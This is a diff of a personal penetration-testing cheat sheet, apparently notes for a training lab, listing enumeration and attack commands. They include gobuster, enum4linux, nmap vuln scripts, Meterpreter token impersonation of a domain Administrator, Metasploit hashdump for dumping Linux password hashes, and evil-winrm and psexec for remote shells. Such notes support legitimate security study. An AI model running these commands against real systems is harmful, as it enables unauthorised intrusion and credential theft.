@@ -1,6 +1,7 @@
 ENUM  -
 gobuster dir -u http://target.com -w /path/to/wordlist.txt
 enum4linux -a // smb*samba enum tool
+nmap --script vuln -p 21 demo.ine.local
 
 Access Token Impersonation -
 migrate to explorer // pgrep explorer // migrate pid
@@ -10,6 +11,9 @@ list_tokens -u
 impersonate_token "ATTACKDEFENSE\Administrator"
 migrate explorer
 
+LINUX PRIVESC -
+sessons -u
+hashdump module in msf // get meterpreter session // use post/linux/gather/hashdump // set SESSION #// exploit
 
 
 RDP -
@@ -31,6 +35,8 @@ evil-winrm.rb -u user -p pass -i ip // gets powershell shell
 wimrm_script // MSF  set FORCE_VBS true
 
 SMB -
+ls -al /usr/share/nmap/scripts | grep -e "smb-*" // lists nmap scripts for smb
+smbclient -L host //check for anonymous login
 smbmap -H ip -u user -p pass 
 psexec.py user@ip cmd.exe // psawns cmd shell
 exploit/windows/psexec //MSF 
